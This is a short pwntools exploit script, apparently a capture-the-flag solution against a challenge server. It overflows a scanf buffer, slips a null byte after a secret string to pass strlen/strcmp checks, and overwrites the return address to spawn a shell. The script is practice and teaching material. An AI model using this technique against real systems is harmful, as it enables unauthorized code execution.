from pwn import *

context.arch = 'amd64'

HOST, PORT = 'ctf.adl.tw', 10001

# --- 二進位裡找出來的關鍵常數 ---
WIN_FUNC = 0x40125b          # shukishukidaishuki()  -> execve("/bin/sh", NULL, NULL)
SECRET   = b'shukishukidaishuki'  # strcmp() 要比對的密語，也是通過 strlen() 檢查的關鍵
BUF_SIZE = 0x20              # char buf[0x20]
SAVED_RBP = 0x8              # 64-bit 下 saved rbp 固定 8 bytes
OFFSET = BUF_SIZE + SAVED_RBP  # = 0x28 (40)，buf 起點到 return address 的距離

p = remote(HOST, PORT, timeout=10)

# main() 的防護邏輯：
#   scanf("%s", buf)              <- 沒有長度限制，可以 overflow
#   if (strlen(buf) > 0x20) exit(0);          <- 檢查1：字串長度
#   if (strcmp(buf, SECRET) != 0) exit(0);    <- 檢查2：字串內容要完全等於 SECRET
#
# 繞過關鍵：%s 只在遇到「空白字元」才停止讀取，遇到 '\x00' 不會停；
# 但 strlen()/strcmp() 都是以 '\x00' 判斷字串結尾。
# 所以在 SECRET 後面塞一個 '\x00'，strlen()/strcmp() 看到的字串就正好是 SECRET，
# 两個檢查都會通過；但 scanf 實際寫入記憶體的 bytes 會繼續往後寫過 '\x00'，
# 一路蓋到 saved rbp 後面的 return address。
payload = SECRET
payload += b'\x00'
payload += b'A' * (OFFSET - len(payload))   # 填滿到 return address 前
payload += p64(WIN_FUNC)                     # 蓋 return address -> shukishukidaishuki()

p.recvuntil(b'messages!', timeout=5)
p.sendline(payload)

p.interactive()
